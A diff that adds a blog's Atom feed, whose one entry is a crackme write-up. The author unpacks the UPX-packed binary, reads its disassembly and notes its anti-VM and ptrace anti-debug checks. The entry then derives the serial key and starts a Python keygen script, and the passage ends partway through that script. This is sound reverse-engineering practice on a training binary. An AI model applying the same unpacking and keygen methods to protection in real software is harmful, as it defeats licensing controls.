@@ -1,0 +1,909 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title></title>
+    <link href="https://0xf4lc0n.github.io/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://0xf4lc0n.github.io/"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2021-04-03T00:00:00+00:00</updated>
+    <id>https://0xf4lc0n.github.io/atom.xml</id>
+    <entry xml:lang="en">
+        <title>ZED-Crackme made by zed-zahir</title>
+        <published>2021-04-03T00:00:00+00:00</published>
+        <updated>2021-04-03T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://0xf4lc0n.github.io/blog/crackme/zed-crackme/" type="text/html"/>
+        <id>https://0xf4lc0n.github.io/blog/crackme/zed-crackme/</id>
+        
+        <content type="html">&lt;p&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;crackmes.one&#x2F;crackme&#x2F;5ecd7cc133c5d449d91ae641&quot;&gt;Download binary&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;When I unpacked the archive and tried to run crackme, a segmentation fault error has occured.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# .&#x2F;ZED-Crackme-x64.bin 
+&lt;&#x2F;span&gt;&lt;span&gt;[1]    11303 segmentation fault (core dumped)  .&#x2F;ZED-Crackme-x64.bin
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;By using the string command I recognized that the file was packed with UPX:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;$Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net $
+&lt;&#x2F;span&gt;&lt;span&gt;$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After unpacking the file it ran properly:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# upx -d ZED-Crackme-x64.bin 
+&lt;&#x2F;span&gt;&lt;span&gt;# .&#x2F;ZED-Crackme-x64.bin
+&lt;&#x2F;span&gt;&lt;span&gt;***********************
+&lt;&#x2F;span&gt;&lt;span&gt;**      rules:       **
+&lt;&#x2F;span&gt;&lt;span&gt;***********************
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;* do not bruteforce
+&lt;&#x2F;span&gt;&lt;span&gt;* do not patch, find instead the serial.
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;enter the passphrase: test
+&lt;&#x2F;span&gt;&lt;span&gt;try again
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The program displayed the rules and waited for password.&lt;&#x2F;p&gt;
+&lt;p&gt;I opened it in IDA. Here we get a first part of a main function:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;zed-crackme&#x2F;img&#x2F;main_stage_1.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After printing rules program saves a null terminated string into memory:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2073692073696854h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;657320706F742061h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;7865742074657263h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;67617373656D2074h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2165h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Let’s call this string “message”. &lt;&#x2F;p&gt;
+&lt;p&gt;So “message” contains “This is a top secret text message!”.&lt;&#x2F;p&gt;
+&lt;p&gt;Next the program checks if it has been run in the virtual machine. If so, the program is terminated otherwise execution proceeds to the next stage.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;zed-crackme&#x2F;img&#x2F;main_stage_2.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The “message” address is loaded to rax register then copied to rsi and rot function is called. The process is then repeated.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edi, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0Dh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;rot
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edi, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0Dh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;rot
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;ROT13 is its own inverse so “message” is firstly encoded and then decoded.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;&amp;quot;This is a top secret text message!&amp;quot; =&amp;gt; rot13 =&amp;gt; &amp;quot;Guvf vf n gbc frperg grkg zrffntr!&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;Guvf vf n gbc frperg grkg zrffntr!&amp;quot; =&amp;gt; rot13 =&amp;gt; &amp;quot;This is a top secret text message!&amp;quot;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;However “message” won’t be used any more in the program and it doesn’t have any influence on serial key generation.&lt;&#x2F;p&gt;
+&lt;p&gt;Next the another string is saved into memory. I named it “password_base”.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;4145443332694841h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;464F434645454244h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_88&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;4546h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_7E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;45h
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The “password_base” contains “AHi23DEADBEEFCOFFEE” and this string will be used to create serial key. In the next lines program takes input from user and calls ptrace in order to check if it’s currently debugging. If so the program is terminated otherwise it will start creating a serial key.&lt;&#x2F;p&gt;
+&lt;p&gt;Here the program creates the first five letters of the key:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;zed-crackme&#x2F;img&#x2F;main_stage_3.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The folowing listing listing extxts that part:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;; rbp+var_90 =&amp;gt; &amp;quot;AHi23DEADBEEFCOFFEE&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;movzx   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;byte ptr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;      ; eax = 0x41 &amp;#39;A&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;xor     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                          ; eax = 0x43 &amp;#39;C&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;s1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], al&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                    ; serial_key[0] = &amp;#39;C&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;movzx   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;byte ptr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;    ; eax = 0x32 &amp;#39;2&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;sub     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0Ah&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                        ; eax = 0x28 &amp;#39;(&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4F&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], al&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                ; serial_key[1] = &amp;#39;(&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;movzx   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;byte ptr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;    ; eax = 0x69 &amp;#39;i&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;add     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0Ch&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                        ; eax = 0x75 &amp;#39;u&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], al&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                ; serial_key[2] = &amp;#39;u&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;movzx   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;byte ptr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;    ; eax = 0x69 &amp;#39;i&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4D&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], al&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                ; seial_key[3] = &amp;#39;i&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;movzx   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;byte ptr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;    ; eax = 0x48 &amp;#39;H&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;add     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                          ; eax = 0x49 &amp;#39;I&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], al&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;                ; serial_key[4] = &amp;#39;I&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Then program sets index to 5 and jumps to loop.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_9C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;5
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;zed-crackme&#x2F;img&#x2F;main_stage_4.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Here we got a loop condition:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;cmp     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_9C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;12h&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;               ; proceed until index isn&amp;#39;t equal to 18
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jle     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;short loc_1514
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In loop program takes each character from “base_password” (starting from 6th character), subtracts 1 from character’s ascii code and then puts the new character into memory (in serial_key array). &lt;&#x2F;p&gt;
+&lt;p&gt;Here is a simple Python script that creates the required serial key:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;password_base &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;AHi23DEADBEEFCOFFEE&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;decoded_password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x0A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;))
